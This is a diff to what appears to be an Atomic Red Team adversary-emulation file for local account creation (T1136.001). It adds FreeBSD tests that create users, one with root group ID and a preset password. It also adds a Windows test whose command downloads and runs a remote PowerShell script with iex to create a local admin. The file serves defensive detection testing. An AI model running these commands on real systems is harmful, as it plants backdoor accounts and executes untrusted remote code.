@@ -10,7 +10,7 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: evil_user
   executor:
     command: |
@@ -18,6 +18,24 @@ atomic_tests:
     cleanup_command: |
       userdel #{username}
     name: bash
+    elevation_required: true
+- name: Create a user account on a FreeBSD system
+  auto_generated_guid: a39ee1bc-b8c1-4331-8e5f-1859eb408518
+  description: |
+    Create a user via pw
+  supported_platforms:
+  - linux
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: string
+      default: evil_user
+  executor:
+    command: |
+      pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
+    cleanup_command: |
+      rmuser -y #{username}
+    name: sh
     elevation_required: true
 - name: Create a user account on a MacOS system
   auto_generated_guid: 01993ba5-1da3-4e15-a719-b690d4f0f0b2
@@ -28,11 +46,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: evil_user
     realname:
       description: "'realname' to record when creating the user"
-      type: String
+      type: string
       default: Evil Account
   executor:
     command: |
@@ -56,11 +74,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: T1136.001_CMD
     password:
       description: Password of the user to create
-      type: String
+      type: string
       default: T1136.001_CMD!
   executor:
     command: |
@@ -79,7 +97,7 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: T1136.001_PowerShell
   executor:
     command: |
@@ -97,11 +115,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: butter
     password:
       description: Password of the user to create
-      type: String
+      type: string
       default: BetterWithButter
   executor:
     command: |
@@ -110,6 +128,29 @@ atomic_tests:
     cleanup_command: |
       userdel #{username}
     name: bash
+    elevation_required: true
+- name: Create a new user in FreeBSD with `root` GID.
+  auto_generated_guid: d141afeb-d2bc-4934-8dd5-b7dba0f9f67a
+  description: |
+    Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
+  supported_platforms:
+  - linux
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: string
+      default: butter
+    password:
+      description: Password of the user to create
+      type: string
+      default: BetterWithButter
+  executor:
+    command: |
+      pw useradd #{username} -g 0 -d /root -s /bin/sh
+      echo "#{password}" | pw usermod #{username} -h 0
+    cleanup_command: |
+      pw userdel #{username}
+    name: sh
     elevation_required: true
 - name: Create a new Windows admin user
   auto_generated_guid: fda74566-a604-4581-a4cc-fbbe21d66559
@@ -120,11 +161,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: T1136.001_Admin
     password:
       description: Password of the user to create
-      type: String
+      type: string
       default: T1136_pass
   executor:
     command: |
@@ -133,4 +174,14 @@ atomic_tests:
     cleanup_command: |
       net user /del "#{username}" >nul 2>&1
     name: command_prompt
+    elevation_required: true
+- name: Create a new Windows admin user via .NET
+  auto_generated_guid: 2170d9b5-bacd-4819-a952-da76dae0815f
+  description: |
+    Creates a new admin user in a powershell session without using net.exe
+  supported_platforms:
+  - windows
+  executor:
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
+    name: powershell
     elevation_required: true
